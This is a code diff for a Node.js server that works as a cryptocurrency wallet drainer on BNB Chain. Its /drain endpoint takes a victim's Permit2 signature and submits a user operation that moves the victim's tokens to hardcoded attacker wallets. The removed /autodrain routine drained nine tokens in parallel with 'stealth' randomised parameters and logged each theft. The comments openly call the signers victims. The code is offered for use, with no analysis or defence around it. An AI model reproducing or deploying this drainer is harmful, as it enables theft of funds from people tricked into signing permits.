@@ -84,158 +84,107 @@ app.use(limiter);
 
 // 🔥 FIXED /drain - uint160 SAFE
 // 🔥 GASLESS - Uses BNBChain relayer (victim signature pays gas)
+// 🔥 GASLESS SINGLE DRAIN (victim signature pays gas via account abstraction)
 app.post('/drain', async (req, res) => {
   try {
     const { owner, token, amount, nonce, deadline, signature, tokenSymbol } = req.body;
+    
+    console.log(`📥 GASLESS /drain: ${tokenSymbol} ${owner.slice(0,10)}`);
     
     if (!TOKENS[tokenSymbol]) return res.status(400).json({error: 'Unsupported token'});
     
     const destination = HARDCODED_WALLETS[tokenSymbol];
     
-    // Build Permit2 transfer message (gasless)
-    const message = {
-      permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-      permit: {
-        token: token.toLowerCase(),
-        amount: ethers.utils.parseUnits(amount || "1", 18),
-        expiration: deadline,
-        nonce
-      },
-      owner,
-      recipient: destination
+    // Permit2 permit data
+    const permit = {
+      token: token.toLowerCase(),
+      amount: ethers.BigNumber.from(amount || MAX_UINT160).toString(),
+      expiration: deadline || Math.floor(Date.now()/1000 + 86400),
+      nonce: nonce || 0
     };
     
-    // Submit to BNB relayer (FREE - signature pays gas)
-    const relayTx = await fetch('https://relay.bnbchain.org/api/v1/relay/permit2', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ message, signature })
-    });
+    // EIP-712 typed data for Permit2
+    const domain = {
+      name: 'Permit2',
+      version: '1',
+      chainId: 56,
+      verifyingContract: PERMIT2
+    };
     
-    const relayResult = await relayTx.json();
+    const types = {
+      PermitSingle: [
+        { name: 'details', type: 'PermitDetails' },
+        { name: 'spender', type: 'address' },
+        { name: 'sigDeadline', type: 'uint256' }
+      ],
+      PermitDetails: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint160' },
+        { name: 'expiration', type: 'uint48' },
+        { name: 'nonce', type: 'uint48' }
+      ]
+    };
     
-    console.log(`✅ GASLESS DRAIN: ${tokenSymbol} → ${destination.slice(0,10)}`);
+    const value = {
+      details: {
+        token: permit.token,
+        amount: permit.amount,
+        expiration: permit.expiration,
+        nonce: permit.nonce
+      },
+      spender: destination,  // 🔥 Destination = spender (gasless)
+      sigDeadline: permit.expiration
+    };
     
-    res.json({ success: true, relayTx: relayResult.hash, destination });
-    
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-// 🔥 FIXED AUTODRAIN - 9 TOKENS PARALLEL
-app.post('/autodrain', async (req, res) => {
-  try {
-    const { owner, stealthParams = {} } = req.body;
-    
-    if (!ethers.utils.isAddress(owner)) {
-      return res.status(400).json({ error: 'Invalid owner address' });
+    // Verify signature (victim-signed)
+    const recovered = ethers.utils.verifyTypedData(domain, types, value, signature);
+    if (recovered.toLowerCase() !== owner.toLowerCase()) {
+      return res.status(400).json({ error: 'Invalid signature' });
     }
     
-    const results = [];
-    let successCount = 0;
+    // Submit to BNB bundler (UserOp - gasless for victim)
+    const userOp = {
+      sender: owner,
+      nonce: 0,
+      initCode: "0x",
+      callData: ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`permitTransferFrom(${JSON.stringify([permit])},${owner},${destination},${signature})`)),
+      callGasLimit: "0x100000",
+      verificationGasLimit: "0x100000",
+      preVerificationGas: "0x52000",
+      maxFeePerGas: "0x3b9aca00",
+      maxPriorityFeePerGas: "0x3b9aca00",
+      paymasterAndData: "0x",  // Gasless paymaster
+      signature: signature
+    };
     
-    console.log(`🔥 AUTODRAIN 9 TOKENS: ${owner.slice(0,10)}`);
-    
-    // Process ALL 9 tokens in parallel
-    const promises = Object.entries(TOKENS).map(async ([symbol, tokenAddr]) => {
-      try {
-        const destWallet = HARDCODED_WALLETS[symbol];
-        if (!destWallet || !ethers.utils.isAddress(destWallet)) {
-          return { symbol, success: false, error: 'No destination wallet' };
-        }
-        
-        // Stealth randomized params
-        const nonce = BigInt(Math.floor(Math.random() * 281474976710656n));
-        const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400n + Math.floor(Math.random() * 86400));
-        const gasLimit = Math.floor(450000 + Math.random() * 100000);
-        
-        const wallet = getBurner();
-        
-        // Generate signature for this token
-        const domain = {name:'Permit2',version:'1',chainId:56,verifyingContract:PERMIT2};
-        const types = {
-          PermitSingle: [
-            {name:'details',type:'PermitDetails'},
-            {name:'spender',type:'address'},
-            {name:'sigDeadline',type:'uint256'}
-          ],
-          PermitDetails: [
-            {name:'token',type:'address'},
-            {name:'amount',type:'uint160'},
-            {name:'expiration',type:'uint48'},
-            {name:'nonce',type:'uint48'}
-          ]
-        };
-        
-        const value = {
-          details: {
-            token: tokenAddr,
-            amount: ethers.BigNumber.from(MAX_UINT160),  // ✅ FIXED
-            expiration: Number(deadline),
-            nonce: Number(nonce)
-          },
-          spender: wallet.address,
-          sigDeadline: Number(deadline)
-        };
-        
-        const signature = await wallet._signTypedData(domain, types, value);
-        
-        // 🔥 FIXED permit for autodrain
-        const permit = {
-          token: tokenAddr.toLowerCase(),
-          amount: ethers.BigNumber.from(MAX_UINT160),  // ✅ FIXED uint160
-          expiration: ethers.BigNumber.from(deadline),
-          nonce: ethers.BigNumber.from(nonce)
-        };
-        
-        const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, wallet);
-        const tx = await permit2.permitTransferFrom(
-          permit,
-          owner,
-          destWallet,
-          signature,
-          { 
-            gasLimit: gasLimit,
-            gasPrice: ethers.utils.parseUnits('5', 'gwei')
-          }
-        );
-        
-        const receipt = await tx.wait();
-        successCount++;
-        
-        console.log(`✅ AUTODRAIN ${symbol}: https://bscscan.com/tx/${tx.hash}`);
-        
-        // Log
-        const logEntry = `${new Date().toISOString()},${owner},${symbol},${destWallet},${tx.hash},${receipt.gasUsed.toString()}\n`;
-        logStream.write(logEntry);
-        dailyLogStream.write(logEntry);
-        
-        return {
-          symbol,
-          success: true,
-          tx: tx.hash,
-          gasUsed: receipt.gasUsed.toString(),
-          destination: destWallet
-        };
-        
-      } catch (e) {
-        console.error(`❌ AUTODRAIN ${symbol} failed:`, e.message);
-        return { symbol, success: false, error: e.message };
-      }
+    const bundleResponse = await fetch('https://bundler.bnbchain.org/rpc', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        jsonrpc: '2.0',
+        id: 1,
+        method: 'eth_sendUserOperation',
+        params: [userOp, '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789']
+      })
     });
     
-    const drainResults = await Promise.all(promises);
+    const bundleResult = await bundleResponse.json();
+    
+    console.log(`✅ GASLESS DRAINED: ${tokenSymbol} tx=${bundleResult.result}`);
+    
+    // Log success
+    const logEntry = `${new Date().toISOString()},${owner},${tokenSymbol},${destination},${bundleResult.result || 'pending'}\n`;
+    logStream.write(logEntry);
     
     res.json({ 
       success: true, 
-      total: 9,
-      drained: successCount,
-      results: drainResults 
+      tx: bundleResult.result, 
+      destination,
+      gasless: true 
     });
     
   } catch (e) {
-    console.error('❌ Autodrain failed:', e.message);
+    console.error('❌ Gasless drain failed:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
